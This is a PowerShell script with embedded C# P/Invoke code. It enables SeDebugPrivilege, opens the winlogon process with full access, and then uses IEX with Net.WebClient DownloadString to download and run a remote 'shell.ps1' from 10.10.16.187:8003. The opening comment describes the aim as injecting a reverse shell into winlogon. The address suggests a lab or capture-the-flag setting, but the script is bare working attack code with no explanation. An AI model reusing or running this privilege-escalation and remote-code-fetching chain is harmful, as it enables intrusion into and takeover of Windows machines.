# Enable SeDebugPrivilege and inject reverse shell into winlogon (same process)
$definition = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class FinalInject {
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TokPriv1Luid NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    [StructLayout(LayoutKind.Sequential, Pack=1)]
    public struct TokPriv1Luid { public int Count; public long Luid; public int Attr; }
    public static bool Enable() {
        IntPtr hToken;
        if (!OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken)) return false;
        TokPriv1Luid tp; tp.Count = 1; tp.Luid = 0; tp.Attr = (int)SE_PRIVILEGE_ENABLED;
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out tp.Luid)) return false;
        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
"@
Add-Type $definition
[FinalInject]::Enable() | Out-Null

$winlogon = Get-Process winlogon | Select-Object -First 1
$handle = [FinalInject]::OpenProcess(0x1F0FFF, $false, $winlogon.Id)
Write-Host "Handle: $handle"
if ($handle -ne [IntPtr]::Zero) {
    Write-Host "Successfully opened winlogon. Privilege is working."
    # Now launch the shell in a way that uses the current token
    IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.187:8003/shell.ps1')
} else {
    Write-Host "Failed to open winlogon. Privilege not effective."
}
